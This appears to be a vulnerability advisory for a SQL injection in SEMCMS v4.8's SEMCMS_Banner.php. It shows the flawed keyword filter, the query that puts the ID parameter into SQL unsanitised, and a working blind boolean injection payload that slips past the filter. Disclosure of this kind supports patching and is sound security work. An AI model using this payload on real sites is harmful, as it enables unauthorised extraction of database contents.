#  Semcms v4.8 SEMCMS_Banner.php SQL Injection

###  Introduction to Semcms

SEMCMS is a foreign trade website content management system (CMS) that supports multiple languages.

```
v4.8zip download link:http://www.sem-cms.com/TradeCmsdown/php/semcms_php_4.8.zip
```

###  Vulnerability description

A SQL injection vulnerability exists in the SEMCMS v4.8 backend. The vulnerability results from a lack of validation of externally entered SQL statements in the SEMCMS_Banner.php parameters ID and lgid. An attacker without an account could exploit this vulnerability to execute illegal SQL commands to obtain sensitive data from the database.

###  Vulnerability analysis

filter function：

```php
function inject_check_sql($sql_str) {

     return preg_match('/select|and|insert|=|%|<|between|update|\'|\*|union|into|load_file|outfile/i',$sql_str); 
} 
function verify_str($str) { 
       if(inject_check_sql($str)) {
           exit('Sorry,You do this is wrong! (.-.)');
        } 
    return $str;
} 

```

The vulnerability exists on line 32 of SEMCMS_Banner.php:

![image-20240325125850992](C:\Users\28162\AppData\Roaming\Typora\typora-user-images\image-20240325125850992.png)

```php
<?php
}elseif($type=="edit"){
    
 $row = mysqli_fetch_array($db_conn->query("SELECT * FROM sc_banner WHERE ID=".$_GET["ID"]));
 
?>
```



The vulnerability exists on line 69 of SEMCMS_Banner.php:

![image-20240325130124241](C:\Users\28162\AppData\Roaming\Typora\typora-user-images\image-20240325130124241.png)

```
payload:-1 or ascii(substr(database(),1,1)) REGEXP char(94,49,48,57,36)
```

When the condition is true:

It should be noted that you need to add pictures before reproducing, otherwise no picture will be generated on the page no matter what the ID and lgid are equal to.

![图片3](D:\Desktop\images\图片3.png)

![图片4](D:\Desktop\images\图片4.png)



![image-20240325130707386](C:\Users\28162\AppData\Roaming\Typora\typora-user-images\image-20240325130707386.png)

![image-20240325130725854](C:\Users\28162\AppData\Roaming\Typora\typora-user-images\image-20240325130725854.png)
